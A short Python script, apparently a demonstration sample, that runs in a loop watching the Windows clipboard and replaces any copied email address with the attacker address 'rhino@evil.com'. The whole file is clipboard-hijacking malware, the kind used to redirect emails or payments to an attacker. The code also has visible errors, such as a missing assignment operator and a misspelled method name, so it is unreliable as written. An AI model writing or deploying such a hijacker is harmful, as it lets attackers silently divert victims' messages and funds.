import win32clipboard, re 
from time import sleep

sample_attacker_email="rhino@evil.com"
emailregex = '^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'

while True:
	win32clipboard. OpenClipboard ()
	data win32clipboard.GetClipboardData().rstrip() 
	print (data)
	if (re.search (emailregex, data)):
		win32clipboard. Emptyclipboard();
		win32clipboard. SetClipboardText (sample_attacker_email)
		break
	win32clipboard.CloseClipboard ()
	sleep (1)
